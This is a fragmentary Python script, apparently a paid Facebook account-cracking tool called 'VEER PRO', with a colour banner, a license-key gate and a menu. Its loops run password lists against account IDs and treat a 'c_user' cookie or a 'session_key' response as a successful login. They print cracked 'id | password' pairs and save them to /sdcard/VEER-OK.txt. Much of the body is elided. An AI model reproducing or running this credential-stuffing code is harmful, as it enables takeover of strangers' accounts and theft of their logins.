...
\33[1;97m ######        ##    ## 
  ...
  \33[;97m
=======================================================
\033[;37m\033[;97m         Facebook       \033[;37m\033[;92m  : RAFIULLAH
...
def approval():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      print("\33[1;97m----------------------------------------------")
      print("\33[1;97mFirst Join VEER Group ")
      print('Copy Key and send VEER Owner')
...
def menu():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        linex()
                        tks = ("Hi VEER Sir, I Need To Buy Your Paid VEER PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in VEER:
                                ...
                                if 'y' in pcp:
                                        print('\r\033[1;97m VEER-CP '+ids+' | '+pas+'\033[1;97m')
...
def api1(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32mVEER-OK '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/VEER-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                print('\r\r\033[1;32mVEER-OK '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/VEER-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
